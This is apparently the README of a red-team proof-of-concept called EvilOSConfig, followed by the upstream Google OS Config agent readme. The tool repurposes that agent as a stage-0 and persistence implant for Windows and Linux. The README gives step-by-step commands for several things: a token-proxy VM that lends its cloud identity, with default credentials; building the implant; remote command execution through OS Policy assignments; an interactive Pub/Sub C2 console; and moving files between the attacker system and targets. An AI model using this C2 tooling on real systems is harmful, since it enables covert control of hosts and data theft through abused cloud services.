# EvilOSConfig

EvilOSConfig is a Proof-of-Concept modified version of Google's official OS Config agent, designed for Windows/Linux stage 0 and persistence payload.  

Conference slides: **TBD**.

AI was used for overall golang programming/code modification and some documentation for this project. 

## Modifications

See [DIFFERENCES.md](./DIFFERENCES.md) for the detailed comparison.

Upstream base: Google OS Config agent at commit [0961d6ac0227](https://github.com/GoogleCloudPlatform/osconfig/commit/0961d6ac02271221d9ccdc49f845dc9aa3e12740)

- Routes metadata and token requests through a proxy on a GCE VM, allowing the agent to run outside GCE using that VM's identity.
- Removes Windows Service Manager integration so the agent can run as a standalone executable.
- Uses temporary OS Policy assignments to run Linux shell or Windows PowerShell commands and retrieve output from compliance reports.
- Adds an optional Pub/Sub command channel that can be toggled through instance metadata without restarting an agent built with the module.
- Transfers files through Cloud Storage signed URLs, with uploads and downloads from either the controller or the agent.
- Reduces the default OS Config polling interval from 10 minutes to 1 minute so metadata changes take effect sooner.

## Prerequisites

```
# Packages 
sudo apt install golang-go make -y 

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud auth login
gcloud config set project <YOUR_PROJECT>

# Enable APIs
gcloud services enable compute.googleapis.com osconfig.googleapis.com pubsub.googleapis.com
```

## Setup

### 1. Create GCE Token Proxy

```bash
# Create the metadata proxy instance
gcloud compute instances create osconfig-token-proxy \
  --zone=asia-northeast3-a \
  --machine-type=e2-micro \
  --image-family=debian-12 \
  --image-project=debian-cloud \
  --metadata-from-file=startup-script=metadata-proxy.sh \
  --metadata=enable-osconfig=true \
  --tags=metadata-proxy \
  --scopes=cloud-platform

# Allow port 8080 (scope to your operator IP)
gcloud compute firewall-rules create allow-metadata-proxy --allow=tcp:8080 --target-tags=metadata-proxy --source-ranges=<YOUR_IP>/32

# Grant Pub/Sub permissions to the proxy's service account
SA=$(gcloud compute instances describe osconfig-token-proxy --zone=asia-northeast3-a --format="value(serviceAccounts.email)")
gcloud projects add-iam-policy-binding $(gcloud config get-value project) --member="serviceAccount:$SA" --role="roles/pubsub.editor" --quiet
```

The startup script (`metadata-proxy.sh`) disables the real OS Config agent and launches the proxy with basic auth. Default creds: `evilosconfig:evilosconfig`

### 2. Bake + Compile

```bash
# Bake Token Proxy / Redirector / CDN - IP and/or DNS + Port 
python3 evilosconfig-controller.py bake <IP/DNS>:<Port>
python3 evilosconfig-controller.py bake testoazurefd.z02.azurefd.net:443

# Build - Linux 
python3 evilosconfig-controller.py compile --trim -o evilosconfig [--with-pubsub]

# Build - Windows 
GOOS=windows GOARCH=amd64 python3 evilosconfig-controller.py compile --trim -o evilosconfig.exe [--with-pubsub]
```

### 3. Deploy + Run

```bash
./evilosconfig 
./evilosconfig.exe 
```

## Usage

### OS Config C2 (~15-20s)

```bash
# Linux target (default)
python3 evilosconfig-controller.py runcmd <INSTANCE_ID> "id && hostname"

# Windows target
python3 evilosconfig-controller.py runcmd <INSTANCE_ID> "whoami; hostname; ipconfig" --os windows
```

### Pub/Sub Fast C2 (~2s)

The Pub/Sub module adds a streaming bidirectional C2 channel through `pubsub.googleapis.com:443`. It's compiled in optionally (`--with-pubsub`) and toggled on/off at runtime via GCE instance metadata.

#### Setup

```bash
# Ensure API, topics/subscriptions, IAM, and enable on the agent
python3 evilosconfig-controller.py enable-pubsub

# Interactive console
python3 evilosconfig-controller.py pubsub-console
# Use Up/Down arrows to navigate command history for this console session.
evilosconfig> whoami && hostname
kali
rt-local
evilosconfig> 

# Disable/re-enable as needed
python3 evilosconfig-controller.py disable-pubsub
python3 evilosconfig-controller.py enable-pubsub
```

## File Upload / Download

File upload and download using GCP Cloud Storage and signed URLs.

### Setup

```bash
# Create and verify the bucket
gcloud storage buckets create "gs://evilosconfig-bucket" --project="<YOUR_PROJECT>" --location="asia-northeast3-a" --uniform-bucket-level-access
gcloud storage buckets list --project="<YOUR_PROJECT>"

# Create and verify the service account
gcloud iam service-accounts create evilosconfig-sa --project="<YOUR_PROJECT>"
gcloud iam service-accounts list --project "<YOUR_PROJECT>"

# Grant storage management permissions on the bucket
gcloud storage buckets add-iam-policy-binding "gs://evilosconfig-bucket" --member="serviceAccount:evilosconfig-sa@gcp-test-498305.iam.gserviceaccount.com" --role="roles/storage.objectAdmin"

# Grant the current gcloud CLI session permission to use the service account
gcloud iam service-accounts add-iam-policy-binding "evilosconfig-sa@gcp-test-498305.iam.gserviceaccount.com" --member="user:<USER_EMAIL>" --role="roles/iam.serviceAccountTokenCreator" --project="<YOUR_PROJECT>"
```

Before using the upload and download features, configure the required values in `.env.json`.

### File Upload

```bash
# Upload a file from the attacker system to storage
echo "Hello, evilosconfig" > /tmp/hello.txt
python3 evilosconfig-controller.py upload --target local /tmp/hello.txt /evilosconfig-bucket/

# Upload a file from the agent system to storage
python3 evilosconfig-controller.py upload --target agent C:/Windows/System32/drivers/etc/hosts /evilosconfig-bucket/
```

### File Download

```bash
# Download a file from storage to the attacker system
python3 evilosconfig-controller.py download --target local /evilosconfig-bucket/hello.txt /tmp/

# Download a file from storage to the agent system
python3 evilosconfig-controller.py download --target agent /evilosconfig-bucket/hello.txt C:/Windows/Temp/
```

## Artifacts

- Linux: `/var/lib/google_osconfig_agent/ +` `/run/lock/osconfig_agent.lock`.
- Windows:`%LOCALAPPDATA%\Google\OSConfig\`

Recipe management can also create `/var/lib/google/osconfig_recipedb` on Linux or `C:\ProgramData\Google\osconfig_recipedb` on Windows.

## Cleanup

Tear down GCP resources created by evilosconfig. 

This will NOT remove bucket, service account, and IAM bindings. 

```bash
ZONE=asia-northeast3-a

# Delete OS Policy assignments
gcloud compute os-config os-policy-assignments list --location=$ZONE --format="value(name)" | grep evilosconfig | xargs -I{} gcloud compute os-config os-policy-assignments delete {} --location=$ZONE --quiet --async

# Delete Pub/Sub subscriptions and topics
gcloud pubsub subscriptions delete evilosconfig-cmd-sub evilosconfig-output-sub --quiet 2>/dev/null
gcloud pubsub topics delete evilosconfig-cmd evilosconfig-output --quiet 2>/dev/null

# Delete GCE proxy instance and firewall rule
gcloud compute instances delete osconfig-token-proxy --zone=$ZONE --quiet
gcloud compute firewall-rules delete allow-metadata-proxy --quiet
```

---

# Google OS Config Agent

This repository contains the OS Config agent and associated end to end tests.

The OS Config agent currently supports the following three main features:

- [OS inventory management](https://cloud.google.com/compute/docs/instances/os-inventory-management)
- [Patch](https://cloud.google.com/compute/docs/os-patch-management)
- [OS policies](https://cloud.google.com/compute/docs/os-config-management)

